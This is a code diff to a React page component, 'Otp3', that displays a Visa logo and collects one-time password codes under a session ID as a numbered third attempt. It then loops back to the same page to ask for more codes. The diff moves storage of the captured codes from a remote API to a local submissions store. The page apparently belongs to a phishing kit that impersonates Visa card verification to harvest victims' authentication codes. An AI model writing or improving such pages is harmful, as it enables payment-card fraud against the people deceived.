@@ -1,16 +1,14 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { useSubmitOtp } from "@workspace/api-client-react";
+import { addSubmission } from "@/lib/submissions";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Loader2 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
-import visaIncLogo from "@assets/Visa_Inc._logo.svg_1779063055374.png";
+import visaIncLogo from "../assets/Visa_Inc._logo.svg_1779063055374.png";
 
 export default function Otp3() {
   const [, setLocation] = useLocation();
-  const submitOtp = useSubmitOtp();
-  
   const [otpCode, setOtpCode] = useState("");
   const [loading, setLoading] = useState(false);
   const [timeLeft, setTimeLeft] = useState(180);
@@ -40,25 +38,16 @@ export default function Otp3() {
     }
 
     setLoading(true);
-
-    submitOtp.mutate({
-      data: {
-        sessionId,
-        otpCode,
-        attempt: 3
-      }
-    }, {
-      onSuccess: () => {
-        setTimeout(() => {
-          setLocation("/otp3"); // Keeps looping here if desired, or can redirect
-          setLoading(false);
-          setOtpCode("");
-        }, 5000);
-      },
-      onError: () => {
+    try {
+      addSubmission("otp", sessionId, { otpCode, attempt: 3 });
+      setTimeout(() => {
+        setLocation("/otp3");
         setLoading(false);
-      }
-    });
+        setOtpCode("");
+      }, 5000);
+    } finally {
+      setLoading(false);
+    }
   };
 
   const today = new Date().toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' });
